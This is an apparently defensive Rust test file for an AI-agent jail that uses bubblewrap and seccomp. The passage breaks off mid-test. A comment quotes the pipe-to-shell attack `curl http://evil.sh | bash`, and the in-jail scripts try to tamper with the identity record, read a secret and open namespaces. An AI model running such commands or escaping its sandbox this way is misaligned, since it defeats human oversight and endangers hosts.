use std::process::Command;

fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_innerwarden")
}

/// A scratch record for the whole test binary.
///
/// Every CLI invocation here must write its narrative somewhere disposable.
/// Without this the suite recorded into the DEVELOPER'S OWN graph at
/// `~/.config/innerwarden/graph.json`: running `cargo test` injected fake attack
/// commands like `curl http://evil.sh | bash` into a real person's record and
/// pruned real history out of it. Found on 2026-08-05 while proving an unrelated
/// recording fix, when the graph under test changed size on its own.
fn scratch_graph() -> &'static std::path::Path {
    static DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
    static PATH: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();
    PATH.get_or_init(|| {
        DIR.get_or_init(|| tempfile::TempDir::new().expect("scratch dir"))
            .path()
            .join("graph.json")
    })
}

/// The CLI under test, pointed at a disposable record by default. A test that
/// asserts on the record sets `IW_GRAPH_FILE` again; the later value wins.
fn cli() -> Command {
    let mut command = Command::new(bin());
    command.env("IW_GRAPH_FILE", scratch_graph());
    command
}

#[cfg(any(target_os = "linux", target_os = "macos"))]
#[test]
fn unsafe_project_is_rejected_before_the_host_hook_is_mutated() {
    let home = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args([
            "contain",
            "--project",
            home.path().to_str().unwrap(),
            "--",
            "/bin/true",
        ])
        .env("HOME", home.path())
        .output()
        .expect("run contain with unsafe project");

    assert_eq!(output.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&output.stderr).contains("unsafe project path"));
    assert!(
        !home.path().join(".claude/settings.json").exists(),
        "validation must happen before hook installation mutates the host"
    );
}

#[cfg(target_os = "linux")]
#[test]
fn linux_backend_masks_innerwarden_secrets_and_keeps_project_available() {
    let backend_available = ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"]
        .iter()
        .any(|path| std::path::Path::new(path).is_file());
    assert!(
        backend_available,
        "CJC-090-AT-007 requires a real trusted bubblewrap binary on Linux; install bwrap on the journey runner instead of silently skipping isolation"
    );
    let home = tempfile::TempDir::new().unwrap();
    let project = tempfile::TempDir::new().unwrap();
    std::fs::create_dir_all(home.path().join(".claude")).unwrap();
    std::fs::write(home.path().join(".claude/history.jsonl"), "{}\n").unwrap();
    let secret = home.path().join(".config/innerwarden/llm-key");
    std::fs::create_dir_all(secret.parent().unwrap()).unwrap();
    std::fs::write(&secret, "CJC-J007-SECRET").unwrap();
    let allowed = project.path().join("allowed.txt");
    std::fs::write(&allowed, "CJC-J007-PROJECT-OK").unwrap();

    let script = format!(
        "if cat '{}' 2>/dev/null; then exit 70; fi; cat '{}'",
        secret.display(),
        allowed.display()
    );
    let output = cli()
        .args([
            "contain",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", home.path())
        .output()
        .expect("run Linux AI Jail");

    assert!(
        output.status.success(),
        "AI Jail failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(String::from_utf8_lossy(&output.stdout).contains("CJC-J007-PROJECT-OK"));
    assert!(!String::from_utf8_lossy(&output.stdout).contains("CJC-J007-SECRET"));
}

#[cfg(target_os = "linux")]
fn require_bwrap() {
    let backend_available = ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"]
        .iter()
        .any(|path| std::path::Path::new(path).is_file());
    assert!(
        backend_available,
        "CJC-090-AT-007 requires a real trusted bubblewrap binary on Linux; install bwrap on the journey runner instead of silently skipping isolation"
    );
}

/// The bwrap `contain` runs: the first of its trusted paths with no symbolic
/// link on the way to it (`/bin` is one on a usr-merged host).
#[cfg(target_os = "linux")]
fn jail_bwrap() -> Option<std::path::PathBuf> {
    ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"]
        .iter()
        .map(std::path::Path::new)
        .find(|path| {
            path.is_file()
                && path.ancestors().all(|at| {
                    std::fs::symlink_metadata(at).is_ok_and(|m| !m.file_type().is_symlink())
                })
        })
        .map(std::path::Path::to_path_buf)
}

/// What a launch on this host does about the jail's seccomp filter, from the
/// facts the launcher reads, computed here so each test asserts exactly one
/// branch.
#[cfg(target_os = "linux")]
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum FilterHere {
    /// No bwrap: a dry run says nothing about it.
    NoBwrap,
    /// The kernel restricts unprivileged user namespaces and bwrap has no
    /// profile: the real run stops with the advice, a dry run says it.
    Restricted,
    /// A throwaway jail under a filter exits 0: every jail gets its filter,
    /// and an identified one's record is schema 2.
    Taken,
    /// Any other host: no filter, the line that says why, schema 1.
    NotTaken,
}

/// What a launch on this host does about the filter. With
/// `IW_REQUIRE_SECCOMP=1` (CI and the release gate set it) anything but
/// [`FilterHere::Taken`] fails the test: a runner whose bwrap stopped taking
/// a filter would otherwise prove only the jail without one, and stay green.
#[cfg(target_os = "linux")]
fn filter_here() -> FilterHere {
    let here = filter_here_unchecked();
    if std::env::var_os("IW_REQUIRE_SECCOMP").is_some_and(|v| v == "1") {
        assert_eq!(
            here,
            FilterHere::Taken,
            "IW_REQUIRE_SECCOMP=1: this host must start a jail under a seccomp filter"
        );
    }
    here
}

#[cfg(target_os = "linux")]
fn filter_here_unchecked() -> FilterHere {
    let Some(bwrap) = jail_bwrap() else {
        return FilterHere::NoBwrap;
    };
    let restricted =
        std::fs::read_to_string("/proc/sys/kernel/apparmor_restrict_unprivileged_userns")
            .is_ok_and(|v| v.trim() == "1");
    let profile = std::path::Path::new("/etc/apparmor.d/bwrap").exists()
        || std::path::Path::new("/etc/apparmor.d/usr.bin.bwrap").exists();
    if restricted && !profile {
        return FilterHere::Restricted;
    }
    // This test's own probe, independent of the launcher's: a filter that
    // allows every call of this build's architecture and kills any other
    // (so a binary under another architecture's emulation is told apart, as
    // the launcher's filter tells it), on a descriptor, under the namespaces
    // the jail unshares.
    let audit_arch: [u8; 4] = if cfg!(target_arch = "x86_64") {
        0xC000_003Eu32.to_le_bytes()
    } else {
        0xC000_00B7u32.to_le_bytes()
    };
    let mut program = vec![0x20, 0, 0, 0, 4, 0, 0, 0, 0x15, 0, 0, 1];
    program.extend(audit_arch);
    program.extend([
        0x06, 0, 0, 0, 0, 0, 0xff, 0x7f, 0x06, 0, 0, 0, 0, 0, 0, 0x80,
    ]);
    let dir = tempfile::TempDir::new().unwrap();
    let filter = dir.path().join("native.bpf");
    std::fs::write(&filter, program).unwrap();
    let taken = Command::new("/bin/sh")
        .args([
            "-c",
            "exec \"$0\" --seccomp 3 --unshare-pid --unshare-uts --unshare-ipc \
             --ro-bind / / true 3<\"$1\"",
        ])
        .arg(&bwrap)
        .arg(&filter)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|status| status.success());
    if taken {
        FilterHere::Taken
    } else {
        FilterHere::NotTaken
    }
}

/// The in-jail script of the identity case: print the PID namespace the
/// jailed process is in, the record the launcher mounted, and whether the
/// agent can rewrite, remove or replace that record. The jail starts only
/// after the launcher handed the record in, so it is there from the first
/// line.
#[cfg(target_os = "linux")]
const READ_THE_RECORD: &str = "readlink /proc/self/ns/pid; \
    cat /run/innerwarden/instance.json; echo; \
    if ( : > /run/innerwarden/instance.json ) 2>/dev/null; then echo RECORD-WRITTEN; fi; \
    if rm -f /run/innerwarden/instance.json 2>/dev/null; then echo RECORD-REMOVED; fi; \
    if mv /run/innerwarden/instance.json /run/innerwarden/x 2>/dev/null; then echo RECORD-MOVED; fi; \
    if ( echo '{}' > /run/innerwarden/other.json ) 2>/dev/null \
        && mv -f /run/innerwarden/other.json /run/innerwarden/instance.json 2>/dev/null; \
        then echo RECORD-REPLACED; fi; \
    if [ -e /run/innerwarden/agent-tls.spki ]; then echo KEY-HANDED-IN; fi; \
    if [ -e /run/innerwarden/system-profiles-root ]; then echo PROFILES-MARKED; fi; \
    grep -E '^Seccomp(_filters)?:' /proc/self/status; \
    grep -E '^CapEff:' /proc/self/status; \
    if ! command -v unshare >/dev/null; then echo NO-UNSHARE; \
    else \
        if unshare -n true 2>/dev/null; then echo NET-UNSHARED; else echo NET-REFUSED; fi; \
        if unshare -U true 2>/dev/null; then echo NESTED-USERNS; else echo NESTED-REFUSED; fi; \
    fi; \
    exit 0";

#[cfg(target_os = "linux")]
fn state_home() -> tempfile::TempDir {
    let home = tempfile::TempDir::new().unwrap();
    std::fs::create_dir_all(home.path().join(".local/state")).unwrap();
    home
}

/// No user service manager (the CI runner has none, and this removes the
/// variable that names one) and no Active Defence: the fallback path, which
/// is the one CI can prove. The scope itself is proven on a lab host by
/// `scripts/tests/contain-identity-escape.sh`.
#[cfg(target_os = "linux")]
fn identified_without_a_scope(command: &mut Command) -> &mut Command {
    command
        .env_remove("XDG_RUNTIME_DIR")
        .env_remove("XDG_STATE_HOME")
        .env("IW_AD_CLI_DIRS", "")
}

#[cfg(target_os = "linux")]
#[test]
fn identity_flag_mounts_the_record_read_only_inside_and_keeps_a_private_copy() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = state_home();
    let project = tempfile::TempDir::new().unwrap();
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            READ_THE_RECORD,
        ])
        .env("HOME", home.path());
    let output = identified_without_a_scope(&mut command)
        .output()
        .expect("run Linux AI Jail with --identity");
    let stderr = String::from_utf8_lossy(&output.stderr);
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(output.status.success(), "AI Jail failed: {stderr}");
    assert!(stderr.contains("instance record:"), "{stderr}");

    // The launcher's copy: one private file, no temp left behind.
    let dir = home.path().join(".local/state/innerwarden/instances");
    let entries: Vec<_> = std::fs::read_dir(&dir)
        .expect("records dir")
        .map(|e| e.unwrap().path())
        .collect();
    // The record, and the note naming the project beside it; no temp file.
    let records: Vec<_> = entries
        .iter()
        .filter(|p| p.extension().is_some_and(|e| e == "json"))
        .cloned()
        .collect();
    assert_eq!(
        entries.len(),
        2,
        "one record, one project note, no temp file: {entries:?}"
    );
    assert_eq!(records.len(), 1, "one record and no temp file: {entries:?}");
    let path = &records[0];
    assert_eq!(
        std::fs::metadata(path).unwrap().permissions().mode() & 0o777,
        0o600
    );
    assert_eq!(
        std::fs::metadata(&dir).unwrap().permissions().mode() & 0o777,
        0o700
    );
    let outside = std::fs::read(path).unwrap();

    // The jail's copy is the same bytes, and the agent can change none of it.
    let mut lines = stdout.lines();
    let ns_line = lines.next().unwrap_or_default().to_string();
    let inside_record = lines.next().unwrap_or_default().to_string();
    assert_eq!(
        inside_record.as_bytes(),
        outside.as_slice(),
        "the record inside the jail is the launcher's: {stdout}"
    );
    for tampered in [
        "RECORD-WRITTEN",
        "RECORD-REMOVED",
        "RECORD-MOVED",
        "RECORD-REPLACED",
    ] {
        assert!(!stdout.contains(tampered), "{tampered}: {stdout}");
    }
    // A host with no key file hands no key in; an identified jail's record
    // says what the plain jail's marker says, so it gets no marker.
    if !std::path::Path::new("/etc/innerwarden/agent-tls.spki").exists() {
        assert!(!stdout.contains("KEY-HANDED-IN"), "{stdout}");
    }
    assert!(!stdout.contains("PROFILES-MARKED"), "{stdout}");

    let record: serde_json::Value = serde_json::from_slice(&outside).unwrap();
    // Schema 2 exactly when this host takes the filter (the throwaway jail
    // under it exits 0): then, and only then, the record says so, the jail's
    // programs run under it and cannot make a user namespace. Any other host
    // writes the schema 1 it always wrote, without the field.
    match filter_here() {
        FilterHere::Taken => {
            assert_eq!(record["schema"], 2, "{record}");
            assert_eq!(record["jail"]["userns_closed"], true, "{record}");
            assert!(runs_under_one_more_filter(&stdout, true), "{stdout}");
            assert!(!stdout.contains("NESTED-USERNS"), "{stdout}");
            if !stdout.contains("NO-UNSHARE") {
                assert!(stdout.contains("NESTED-REFUSED"), "{stdout}");
            }
        }
        FilterHere::NotTaken => {
            assert_eq!(record["schema"], 1, "{record}");
            assert!(record["jail"].get("userns_closed").is_none(), "{record}");
            // Each thing the jail runs without is said: user namespaces,
            // and the plain jail's rules (keystrokes, new subvolumes) the
            // identified filter also carried.
            assert!(
                stderr.contains(
                    "innerwarden contain: user namespaces stay open (userns_probe_failed)"
                ),
                "{stderr}"
            );
            assert!(
                stderr.contains("innerwarden contain: no sandbox filter (filter_probe_failed)"),
                "{stderr}"
            );
        }
        other => panic!("the jail ran on a host where {other:?}: {record}"),
    }
    // No capability inside, filter or not, whoever runs the launcher: as
    // root bwrap would otherwise keep every one of root's, in the host's user
    // namespace, and a new network or mount namespace would follow.
    assert!(stdout.contains("CapEff:\t0000000000000000"), "{stdout}");
    if !stdout.contains("NO-UNSHARE") {
        assert!(stdout.contains("NET-REFUSED"), "{stdout}");
    }
    assert_eq!(record["agent_type"], "claude-code");
    assert_eq!(record["mode"], "monitor");
    assert_eq!(
        record["project"].as_str().unwrap(),
        project.path().file_name().unwrap().to_str().unwrap(),
        "a folder name, not a path"
    );
    assert_eq!(
        path.file_stem().unwrap().to_str().unwrap(),
        record["instance_id"].as_str().unwrap()
    );
    // No manager, no scope, and the launcher says what that costs.
    assert!(record.get("scope").is_none(), "{record}");
    assert!(stderr.contains("identity is at most observed"), "{stderr}");
    assert!(
        !stderr.contains("system scope"),
        "no Active Defence, no request: {stderr}"
    );
    // The namespace the launcher recorded is the one the jailed process saw.
    let inside: u64 = ns_line
        .trim()
        .strip_prefix("pid:[")
        .and_then(|r| r.strip_suffix(']'))
        .unwrap_or_else(|| panic!("namespace link in stdout: {stdout:?}"))
        .parse()
        .unwrap();
    assert_eq!(record["jail"]["pid_ns"].as_u64().unwrap(), inside);
    let host = std::fs::read_link("/proc/self/ns/pid").unwrap();
    assert_ne!(
        format!("pid:[{inside}]"),
        host.to_string_lossy(),
        "the jail is not in the launcher's namespace"
    );
    assert!(record["jail"]["pid"].as_u64().unwrap() > 0);
    assert!(record["jail"]["start_ticks"].as_u64().unwrap() > 0);
}

#[cfg(target_os = "linux")]
#[test]
fn without_the_identity_flag_no_record_is_written_and_nothing_changes() {
    require_bwrap();
    let home = state_home();
    let project = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args([
            "contain",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            "readlink /proc/self/ns/pid; \
             if [ -e /run/innerwarden/system-profiles-root ]; then echo PROFILES-MARKED; fi; \
             grep -E '^Seccomp(_filters)?:' /proc/self/status; \
             if ! command -v unshare >/dev/null; then echo NO-UNSHARE; \
             elif unshare -U true 2>/dev/null; then echo NESTED-USERNS; else echo NESTED-REFUSED; fi",
        ])
        .env("HOME", home.path())
        .env_remove("XDG_STATE_HOME")
        .output()
        .expect("run Linux AI Jail");
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stderr.contains("instance record"), "{stderr}");
    assert!(
        !stderr.contains("scope"),
        "flag off: no scope, no word of one: {stderr}"
    );
    assert!(
        !home.path().join(".local/state/innerwarden").exists(),
        "flag off: no directory, no record"
    );
    // The launcher's marker that the way to the system profiles file is
    // root's: only where the host has that file.
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert_eq!(
        stdout.contains("PROFILES-MARKED"),
        std::path::Path::new(SYSTEM_PROFILES).exists(),
        "{stdout}"
    );
    // The one change without the flag, on purpose: the jail's programs run
    // under the terminal filter where the host takes it, which refuses the
    // two terminal commands that push input (by every ABI the kernel runs,
    // 32-bit ones included) and nothing else a plain jail could do before,
    // user namespaces included.
    match filter_here() {
        FilterHere::Taken => {
            assert!(runs_under_one_more_filter(&stdout, true), "{stdout}");
            assert!(!stderr.contains("no sandbox filter"), "{stderr}");
            if !stdout.contains("NO-UNSHARE") && unshare_works_here() {
                assert!(stdout.contains("NESTED-USERNS"), "{stdout}");
            }
        }
        FilterHere::NotTaken => {
            assert!(
                stderr.contains("innerwarden contain: no sandbox filter (filter_probe_failed)"),
                "{stderr}"
            );
            assert!(runs_under_one_more_filter(&stdout, false), "{stdout}");
        }
        other => panic!("the jail ran on a host where {other:?}: {stdout}"),
    }
}

/// The `Seccomp_filters:` count of a `/proc/<pid>/status` text.
#[cfg(target_os = "linux")]
fn seccomp_filters(status: &str) -> Option<u32> {
    status
        .lines()
        .find_map(|l| l.strip_prefix("Seccomp_filters:"))
        .and_then(|n| n.trim().parse().ok())
}

/// Whether the jail's programs (their `/proc/self/status` lines in
/// `inside`) run under exactly one filter more than this test does when
/// `filtered`, and under the same ones otherwise. The count, not the mode:
/// a test that already runs under a filter (a container's, an emulator's)
/// shows mode 2 inside any jail. A kernel too old to count filters (before
/// 5.9) is judged by the mode alone, and only where the jail has one.
#[cfg(target_os = "linux")]
fn runs_under_one_more_filter(inside: &str, filtered: bool) -> bool {
    let own = std::fs::read_to_string("/proc/self/status")
        .ok()
        .as_deref()
        .and_then(seccomp_filters);
    match (own, seccomp_filters(inside)) {
        (Some(own), Some(jail)) => jail == own + u32::from(filtered),
        _ => !filtered || inside.contains("Seccomp:\t2"),
    }
}

/// Whether a jail without any filter can make a user namespace here: the
/// host's own answer, so the plain jail is held to what it could do before.
#[cfg(target_os = "linux")]
fn unshare_works_here() -> bool {
    let Some(bwrap) = jail_bwrap() else {
        return false;
    };
    Command::new(bwrap)
        .args([
            "--unshare-pid",
            "--unshare-uts",
            "--unshare-ipc",
            "--ro-bind",
            "/",
            "/",
            "unshare",
            "-U",
            "true",
        ])
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .is_ok_and(|status| status.success())
}

/// The host's system profiles file.
#[cfg(target_os = "linux")]
const SYSTEM_PROFILES: &str = "/etc/innerwarden/agent-profiles.toml";

#[cfg(target_os = "linux")]
#[test]
fn dry_run_shows_the_record_and_info_descriptors_only_with_the_identity_flag() {
    let home = tempfile::TempDir::new().unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let dry = |identity: bool| {
        let mut args = vec!["contain", "--dry-run"];
        if identity {
            args.push("--identity");
        }
        args.extend([
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/true",
        ]);
        let out = cli()
            .args(args)
            .env("HOME", home.path())
            .env_remove("XDG_RUNTIME_DIR")
            .output()
            .expect("dry run");
        assert!(out.status.success());
        String::from_utf8_lossy(&out.stdout).into_owned()
    };
    let plain = dry(false);
    let identified = dry(true);
    assert!(!plain.contains("--info-fd"), "{plain}");
    assert!(
        !plain
            .replace(
                " --ro-bind-data 12 /run/innerwarden/system-profiles-root",
                ""
            )
            .contains("--ro-bind-data"),
        "{plain}"
    );
    assert!(!plain.contains("scope"), "{plain}");
    assert!(
        identified.contains(" --ro-bind-data 10 /run/innerwarden/instance.json --die-with-parent "),
        "the record is the last mount: {identified}"
    );
    assert!(
        identified.contains("--info-fd 9 -- /bin/true"),
        "{identified}"
    );
    // The key of Active Defence is handed in, just before the record, only
    // where the host has a key the launcher believes; with no key file there
    // is no mount, and the plain run never has one.
    let key = " --ro-bind-data 11 /run/innerwarden/agent-tls.spki";
    assert!(!plain.contains("agent-tls.spki"), "{plain}");
    // A plain jail gets the marker that the way to the system profiles file
    // is root's only where the host has that file; an identified jail never
    // does (its record says the same). Without the file both are today's.
    let marker = " --ro-bind-data 12 /run/innerwarden/system-profiles-root";
    assert_eq!(
        plain.contains(marker),
        std::path::Path::new(SYSTEM_PROFILES).exists(),
        "{plain}"
    );
    assert!(!identified.contains("system-profiles-root"), "{identified}");
    let plain = plain.replace(marker, "");
    if !std::path::Path::new("/etc/innerwarden/agent-tls.spki").exists() {
        assert!(!identified.contains("agent-tls.spki"), "{identified}");
    } else if identified.contains(key) {
        assert!(
            identified.contains(&format!(
                "{key} --ro-bind-data 10 /run/innerwarden/instance.json "
            )),
            "the key is just before the record: {identified}"
        );
    }
    // No manager named (or no systemd-run at all): the dry run says the real
    // run would have no scope, and what that costs.
    let scope_lines: Vec<&str> = identified
        .lines()
        .filter(|l| l.starts_with("# innerwarden contain: no scope ("))
        .collect();
    assert_eq!(scope_lines.len(), 1, "{identified}");
    assert!(
        scope_lines[0].ends_with("): identity is at most observed"),
        "{identified}"
    );
    // The command gets its own PATH and loader variables back through bwrap,
    // because the launcher's helpers run with a fixed PATH: those pairs, and
    // the agent name the hook is told, are the flag's other additions.
    let identified = {
        let mut tokens = identified.split(' ').peekable();
        let mut kept: Vec<&str> = Vec::new();
        while let Some(token) = tokens.next() {
            if token == "--setenv" {
                let name = tokens.next().unwrap_or("");
                let value = tokens.next().unwrap_or("");
                if name == "PATH" || name.starts_with("LD_") {
                    continue;
                }
                kept.extend(["--setenv", name, value]);
            } else {
                kept.push(token);
            }
        }
        kept.join(" ")
    };
    let identified: String = identified
        .lines()
        .filter(|l| !l.starts_with("#   IW_HOOK_AGENT="))
        .map(|l| format!("{l}\n"))
        .collect();
    // The ways the dry run speaks of the filter: the filter in the argument
    // list, the line that says why it is not there, or, where the kernel's
    // restriction stops the real run first, its advice. Exactly the one this
    // host's facts give; the plain run shows the same filter (its own, the
    // terminal one) and never the advice.
    let option = " --unshare-ipc --seccomp 13 --cap-drop ALL --hostname ai-sandbox ";
    let plain_option = " --unshare-ipc --seccomp 13 --hostname ai-sandbox ";
    let said = "# innerwarden contain: user namespaces stay open (";
    let plain_said = "# innerwarden contain: no sandbox filter (filter_probe_failed): ";
    let advice = "# innerwarden contain: this kernel restricts unprivileged user namespaces";
    assert!(
        !plain.contains("--disable-userns")
            && !identified.contains("--disable-userns")
            && !identified.contains("--unshare-user")
            && !plain.contains(said)
            && !plain.contains(advice),
        "{plain}"
    );
    let here = filter_here();
    assert_eq!(
        (
            identified.contains(option),
            identified.contains(said),
            identified.contains(advice)
        ),
        match here {
            FilterHere::NoBwrap => (false, false, false),
            FilterHere::Restricted => (false, false, true),
            FilterHere::Taken => (true, false, false),
            FilterHere::NotTaken => (false, true, false),
        },
        "{here:?}: {identified}"
    );
    assert_eq!(
        (plain.contains(plain_option), plain.contains(plain_said)),
        match here {
            FilterHere::NoBwrap | FilterHere::Restricted => (false, false),
            FilterHere::Taken => (true, false),
            FilterHere::NotTaken => (false, true),
        },
        "{here:?}: {plain}"
    );
    assert!(identified.matches("--seccomp").count() <= 1, "{identified}");
    if here == FilterHere::NotTaken {
        assert!(
            identified
                .lines()
                .filter(|l| l.starts_with(said))
                .all(|l| l.contains("(userns_probe_failed)")),
            "{identified}"
        );
        // The plain jail's rules went with the identified filter: said too.
        assert!(
            identified.lines().any(|l| l.starts_with(plain_said)),
            "{identified}"
        );
    }
    // Every identified jail drops every capability, filter or not; the plain
    // one never asks.
    assert_eq!(
        identified.matches(" --cap-drop ALL ").count(),
        1,
        "{identified}"
    );
    assert!(!plain.contains("--cap-drop"), "{plain}");
    // The advice block is the real run's refusal, said as comments.
    let advice_lines: Vec<&str> = if here == FilterHere::Restricted {
        identified
            .lines()
            .skip_while(|l| !l.starts_with(advice))
            .take_while(|l| l.starts_with('#'))
            .collect()
    } else {
        Vec::new()
    };
    let plain: String = plain
        .lines()
        .filter(|l| !l.starts_with(plain_said))
        .map(|l| format!("{l}\n"))
        .collect();
    let without: String = identified
        .replace(" --ro-bind-data 10 /run/innerwarden/instance.json", "")
        .replace(key, "")
        .replace(" --info-fd 9", "")
        .replace(" --cap-drop ALL", "")
        .replace(
            &format!(
                " --tmpfs {}",
                home.path()
                    .join(".local/state/innerwarden/instances")
                    .display()
            ),
            "",
        )
        .lines()
        .filter(|l| {
            !l.starts_with("# innerwarden contain: no scope")
                && !l.starts_with(said)
                && !l.starts_with(plain_said)
                && !advice_lines.contains(l)
        })
        .map(|l| format!("{l}\n"))
        .collect();
    assert_eq!(without, plain, "the flag adds these and nothing else");
    assert!(
        !home.path().join(".local/state/innerwarden").exists(),
        "a dry run writes no record"
    );
}

#[cfg(not(any(target_os = "linux", target_os = "macos")))]
#[test]
fn unsupported_platform_fails_without_claiming_a_jail() {
    let home = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args(["contain", "--", "echo", "ok"])
        .env("HOME", home.path())
        .output()
        .expect("run contain");
    assert_eq!(output.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&output.stderr).contains("not supported"));
}

/// Inside an identified jail: the mount namespace, the agent the launcher
/// named, `PATH`, and what is left of the launcher's records folder.
#[cfg(target_os = "linux")]
const LOOK_AT_THE_LAUNCHER: &str = "readlink /proc/self/ns/mnt; \
    echo \"agent=$IW_HOOK_AGENT\"; \
    echo \"path=$PATH\"; \
    d=\"$HOME/.local/state/innerwarden/instances\"; \
    echo \"seen=$(ls -A \"$d\" 2>/dev/null | wc -l | tr -d ' ')\"; \
    ( echo forged > \"$d/forged.json\" ) 2>/dev/null; \
    for f in \"$d\"/*.json; do [ -f \"$f\" ] && ( : > \"$f\" ) 2>/dev/null; done; \
    exit 0";

/// The launcher's records folder is under `~/.local`, which the jail binds
/// read-write. With `--identity` the jail sees it empty and nothing written
/// there reaches the host; the record names the mount namespace the jailed
/// process is in; the hook is told the agent; the command keeps its `PATH`.
#[cfg(target_os = "linux")]
#[test]
fn identity_hides_the_launchers_records_and_names_the_jails_mount_namespace() {
    require_bwrap();
    let home = state_home();
    let project = tempfile::TempDir::new().unwrap();
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            LOOK_AT_THE_LAUNCHER,
        ])
        .env("HOME", home.path());
    let output = identified_without_a_scope(&mut command)
        .output()
        .expect("run Linux AI Jail with --identity");
    let stderr = String::from_utf8_lossy(&output.stderr);
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(output.status.success(), "AI Jail failed: {stderr}");

    let dir = home.path().join(".local/state/innerwarden/instances");
    let entries: Vec<_> = std::fs::read_dir(&dir)
        .expect("records dir")
        .map(|e| e.unwrap().path())
        .collect();
    let records: Vec<_> = entries
        .iter()
        .filter(|p| p.extension().is_some_and(|e| e == "json"))
        .cloned()
        .collect();
    assert_eq!(entries.len(), 2, "nothing written in the jail: {entries:?}");
    assert_eq!(records.len(), 1, "nothing written in the jail: {entries:?}");
    let outside = std::fs::read(&records[0]).unwrap();
    assert!(!outside.is_empty(), "the record was not truncated");
    let record: serde_json::Value = serde_json::from_slice(&outside).unwrap();

    let mut lines = stdout.lines();
    let mnt: u64 = lines
        .next()
        .unwrap_or_default()
        .trim()
        .strip_prefix("mnt:[")
        .and_then(|r| r.strip_suffix(']'))
        .unwrap_or_else(|| panic!("mount namespace link in stdout: {stdout:?}"))
        .parse()
        .unwrap();
    assert_eq!(record["jail"]["mnt_ns"].as_u64().unwrap(), mnt, "{stdout}");
    let host = std::fs::read_link("/proc/self/ns/mnt").unwrap();
    assert_ne!(format!("mnt:[{mnt}]"), host.to_string_lossy());
    assert_eq!(lines.next(), Some("agent=claude-code"), "{stdout}");
    let path = std::env::var("PATH").unwrap_or_default();
    assert_eq!(
        lines.next(),
        Some(format!("path={path}").as_str()),
        "{stdout}"
    );
    assert_eq!(lines.next(), Some("seen=0"), "{stdout}");
}

/// A home whose own profile starts the claude-code jail only once Active
/// Defence on the host admitted it.
#[cfg(target_os = "linux")]
fn home_that_starts_only_once_admitted() -> tempfile::TempDir {
    use std::os::unix::fs::PermissionsExt;
    let home = state_home();
    let dir = home.path().join(".config/innerwarden");
    std::fs::create_dir_all(&dir).unwrap();
    let file = dir.join("agent-profiles.toml");
    std::fs::write(
        &file,
        "schema_version = 2\n[profile.claude-code.jail]\nstart = \"only_when_admitted\"\n",
    )
    .unwrap();
    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600)).unwrap();
    home
}

/// The processes whose command line names `marker`: a jail left behind.
#[cfg(target_os = "linux")]
fn processes_naming(marker: &std::path::Path) -> Vec<String> {
    let needle = marker.to_string_lossy().into_owned();
    std::fs::read_dir("/proc")
        .unwrap()
        .flatten()
        .filter(|entry| entry.file_name().to_string_lossy().parse::<u32>().is_ok())
        .filter_map(|entry| std::fs::read(entry.path().join("cmdline")).ok())
        .map(|bytes| String::from_utf8_lossy(&bytes).replace('\0', " "))
        .filter(|line| line.contains(&needle))
        .collect()
}

/// What the launcher's child wrote on stderr, read to its end on a thread,
/// so a process that outlived the launcher is waited for, up to a bound.
#[cfg(target_os = "linux")]
fn stderr_to_end(child: &mut std::process::Child) -> std::sync::mpsc::Receiver<String> {
    let mut stderr = child.stderr.take().expect("stderr piped");
    let (send, receive) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        let mut text = String::new();
        let _ = std::io::Read::read_to_string(&mut stderr, &mut text);
        let _ = send.send(text);
    });
    receive
}

/// F17-cw: a jail whose profile starts it only once the host admitted it,
/// on a host with no Active Defence, never runs its command. The launcher
/// says why and exits 2, its own record of the instance is removed, and no
/// process of the jail is left. The jail's first process is ended while it
/// waits for its record, so not even the gate runs.
///
/// FAILS ON REVERT: hand the record in whatever the host said (drop the
/// `starts` check in `launch_identified`) and the command runs; end only
/// bwrap in `end_jail` (before 11908c7) and the jail's first process reads
/// the closed pipe and runs the gate, whose refusal is then on stderr.
#[cfg(target_os = "linux")]
#[test]
fn a_jail_the_host_did_not_admit_never_runs_its_command() {
    require_bwrap();
    let home = home_that_starts_only_once_admitted();
    let project = tempfile::TempDir::new().unwrap();
    let marker = project.path().join("COMMAND-RAN");
    let script = format!("touch '{}'", marker.display());
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", home.path())
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::piped());
    let mut child = identified_without_a_scope(&mut command)
        .spawn()
